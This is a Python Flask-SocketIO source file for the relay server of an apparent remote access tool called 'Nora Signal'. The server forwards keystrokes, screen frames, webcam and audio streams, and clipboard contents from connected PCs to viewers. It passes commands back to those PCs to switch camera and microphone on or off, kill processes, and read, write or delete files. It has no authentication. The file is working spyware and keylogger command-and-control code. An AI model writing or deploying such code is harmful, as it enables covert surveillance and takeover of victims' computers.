"""
Nora Signal relay server.

Agents (PC clients) connect and emit:
  register        {"name": "<hostname>"}
  frame           {"data": "<base64 jpeg>"}
  key             {"char": "<key>"}
  camera_frame    {"data": "<base64 jpeg>"}
  clipboard       {"text": "<text>"}

Hubs (viewers) connect and emit:
  hub_join        {}
  command         {"action":..., "_target": "<agent name>"}
  get_processes   {"_target": "<agent name>"}
  kill_process    {"pid": <int>, "_target": "<agent name>"}
  camera_on       {"_target": "<agent name>"}
  camera_off      {"_target": "<agent name>"}

The relay forwards agent events to all hubs (adding "_agent" key),
and hub commands to the named target agent.
"""

from flask import Flask, send_from_directory, request as freq
from flask_socketio import SocketIO, emit, join_room
import os

_DIR = os.path.dirname(os.path.abspath(__file__))

app = Flask(__name__, static_folder=_DIR)
socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode="threading",
    max_http_buffer_size=10 * 1024 * 1024,
)

agents = {}       # sid -> {"name": str}
name_to_sid = {}  # name -> sid
HUB_ROOM = "hubs"


def _agent_list():
    return [{"name": v["name"]} for v in agents.values()]


@app.route("/")
def index():
    return send_from_directory(_DIR, "hub.html")


@app.route("/hub.html")
def hub_html():
    return send_from_directory(_DIR, "hub.html")


# ── Agent registration ────────────────────────────────────────────────────────

@socketio.on("register")
def on_register(data):
    sid = freq.sid
    name = str(data.get("name", "agent"))
    agents[sid] = {"name": name}
    name_to_sid[name] = sid
    emit("registered", {"name": name})
    socketio.emit("agent_list", _agent_list(), room=HUB_ROOM)


# ── Hub join ──────────────────────────────────────────────────────────────────

@socketio.on("hub_join")
def on_hub_join(_data=None):
    join_room(HUB_ROOM)
    emit("agent_list", _agent_list())


# ── Disconnect ────────────────────────────────────────────────────────────────

@socketio.on("disconnect")
def on_disconnect():
    sid = freq.sid
    info = agents.pop(sid, None)
    if info:
        if name_to_sid.get(info["name"]) == sid:
            del name_to_sid[info["name"]]
        socketio.emit("agent_list", _agent_list(), room=HUB_ROOM)


# ── Agent → Hub forwarding ────────────────────────────────────────────────────

def _make_fwd(event):
    def _handler(data):
        sid = freq.sid
        if not isinstance(data, dict):
            data = {}
        data["_agent"] = agents.get(sid, {}).get("name", "?")
        socketio.emit(event, data, room=HUB_ROOM)
    _handler.__name__ = f"fwd_{event}"
    return _handler

for _ev in ("frame", "key", "camera_frame", "clipboard", "ngrok_url", "audio"):
    socketio.on(_ev)(_make_fwd(_ev))


# ── Hub → Agent commands ──────────────────────────────────────────────────────

def _to_agent(data, event=None):
    """Emit `event` (or data's own event key) to the named target agent."""
    target_name = data.get("_target")
    target_sid = name_to_sid.get(target_name)
    if target_sid:
        ev = event or "command"
        socketio.emit(ev, data, room=target_sid)


@socketio.on("command")
def on_command(data):
    _to_agent(data, "command")


@socketio.on("camera_on")
def on_camera_on(data):
    _to_agent(data, "camera_on")


@socketio.on("camera_off")
def on_camera_off(data):
    _to_agent(data, "camera_off")


@socketio.on("mic_on")
def on_mic_on(data):
    _to_agent(data, "mic_on")


@socketio.on("mic_off")
def on_mic_off(data):
    _to_agent(data, "mic_off")


# ── Process list (request/response) ──────────────────────────────────────────

@socketio.on("get_processes")
def on_get_processes(data):
    requester = freq.sid
    target_sid = name_to_sid.get(data.get("_target"))
    if target_sid:
        socketio.emit("get_processes", {"_requester": requester}, room=target_sid)


@socketio.on("processes_result")
def on_processes_result(data):
    requester = data.get("_requester")
    if requester:
        socketio.emit("processes_result", data, room=requester)


@socketio.on("kill_process")
def on_kill_process(data):
    target_sid = name_to_sid.get(data.get("_target"))
    if target_sid:
        socketio.emit("kill_process", data, room=target_sid)


# ── File manager (request/response) ──────────────────────────────────────────

def _fm_request(event, data):
    """Forward a file manager request to the named target agent, tagging the requester."""
    target_sid = name_to_sid.get(data.get("_target"))
    if target_sid:
        data["_requester"] = freq.sid
        socketio.emit(event, data, room=target_sid)

for _fmev in ("list_dir", "read_file", "write_file", "delete_path"):
    def _make_fm_handler(ev):
        def _h(data):
            _fm_request(ev, data)
        _h.__name__ = f"fm_{ev}"
        return _h
    socketio.on(_fmev)(_make_fm_handler(_fmev))


def _fm_response(event, data):
    requester = data.get("_requester")
    if requester:
        socketio.emit(event, data, room=requester)

for _rsev in ("dir_result", "file_data", "write_result", "delete_result"):
    def _make_rs_handler(ev):
        def _h(data):
            _fm_response(ev, data)
        _h.__name__ = f"rs_{ev}"
        return _h
    socketio.on(_rsev)(_make_rs_handler(_rsev))


# ── Local dev entry point ─────────────────────────────────────────────────────

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host="0.0.0.0", port=port, allow_unsafe_werkzeug=True)
